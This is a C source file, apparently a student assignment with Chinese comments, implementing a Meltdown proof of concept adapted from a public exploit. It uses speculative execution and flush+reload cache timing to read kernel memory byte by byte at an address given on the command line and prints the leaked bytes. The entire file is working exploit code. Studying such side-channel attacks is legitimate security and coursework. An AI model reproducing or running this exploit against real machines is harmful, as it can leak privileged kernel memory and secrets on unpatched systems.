#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h> 
#include <unistd.h>
#include <fcntl.h>
#include <x86intrin.h>
#define VARIANTS_READ (1 << 8)
#define PAGESIZE (1 << 12)

jmp_buf jump_buffer;

static char target_array[VARIANTS_READ * PAGESIZE] = {};

int readbyte(int, char* );
void flush_target(void);
void attack(char*);
unsigned long long get_time(volatile char*);
int probe();

void handler(int sig) {
	(void)sig;
	siglongjmp(jump_buffer, 1);
}

int readbyte(int fd, char *addr) {//运用meltdown原理读取指定地址addr内一个字节的内容
								  //具体见报告
	static char buf[256];
	pread(fd, buf, sizeof(buf), 0);//读取/proc/version中的内容，这里的说明见报告
	flush_target(); //将target数组中的所有数从缓存中移除
	attack(addr);

	return probe();
}

void flush_target(void) //引用自github.com/paboldin/meltdown-exploit/blob/master/meltdown.c
{
	for (int i = 0; i < VARIANTS_READ; i++) {
		_mm_clflush(&target_array[i * PAGESIZE]);
	}
}

void attack(char* addr)
{
	if (!sigsetjmp(jump_buffer,1)) {//出现段错误则跳过以下代码

		asm volatile (  /*引用自github.com/paboldin/meltdown-exploit/blob/master/meltdown.c，作用是进行一定的延时保证变量进入cache*/
			".rept 300\n\t"
			"add $0x141, %%rax\n\t"
			".endr\n\t"

			//核心代码，原理见报告
			"movzx (%[addr]), %%rax\n\t"
			"shl $12, %%rax\n\t"
			"mov (%[target], %%rax, 1), %%rbx\n\t"

			//后面为内嵌汇编的限定字符串
			:
		: [target] "r" (target_array),
			[addr] "r" (addr)
			: "rax", "rbx"
			);
	}
}


unsigned long long get_time(volatile char *addr) { //读取一个地址内的字节读出来的时间，以判断是否在cache中.引用自github.com/paboldin/meltdown-exploit/blob/master/meltdown.c
	unsigned long long  time1, time2;
	int tmp = 0;
	time1 = __rdtscp(&tmp); 
	asm volatile ("movl (%0), %%eax\n" : : "c"(addr) : "eax");//
	time2 = __rdtscp(&tmp) - time1;
	return time2;
}

int probe() {  //检查数组里每个位置读取的时间，寻找最小的那个，即可判断攻击地址的值
	int i, m;
	int volatile mix_i, min_i, min_time = 10000000000;
	unsigned long long time;
	char *check_addr;
	for (i = 0; i<256; i++) {
		mix_i = ((i * 167) + 13) & 255; //这个代码的目的是打乱读取的顺序，防止编译器对读取进行优化
		check_addr = &target_array[PAGESIZE*mix_i];
		time = get_time(check_addr);
		if (min_time > time) {
			min_time = time;
			min_i = mix_i;
		}
	}
	return min_i;
}

int main(int argc, const char* * argv) {

	signal(SIGSEGV, handler);

	//代码是为了处理段错误，发生段错误时进入编写的处理函数handler

	int times[256] = {};
	int temp_times, temp_tag;
	char* addr; //将要攻击的地址
	char result[256]; //保存地址中猜测的内容
	int tmp, len;
	int fd = open("/proc/version", O_RDONLY); //关于这行代码，见报告

	memset(target_array, 1, sizeof(target_array));

	sscanf(argv[1], "%lx", &addr); //linux_proc_banner的地址
	sscanf(argv[2], "%d", &len); //指定长度,最长256字节
	int max_times = 0;
	int max_tag;
	for (int j = 0; j<len; j++) {
		memset(times, 0, sizeof(times));
		for (int i = 0; i<1000; i++) { //进行1000次猜测
			temp_tag = readbyte(fd, addr);
			temp_times = ++times[temp_tag];//命中时，给次数数组中相应编号的数加1
			if (temp_times > max_times) {
				max_times = temp_times;
				max_tag = temp_tag;
			}
		}
		if (max_times > 500) { //假如有500次以上猜测为同一个数，说明比较有把握
			printf("%d:%c\n", j, max_tag);
		}
		else {
			printf("%d:can't be sure!\n", j);
		}
		result[j] = max_tag;
		addr++;
	}
	result[len] = '\0';
	printf("The result is %s\n", result);
}
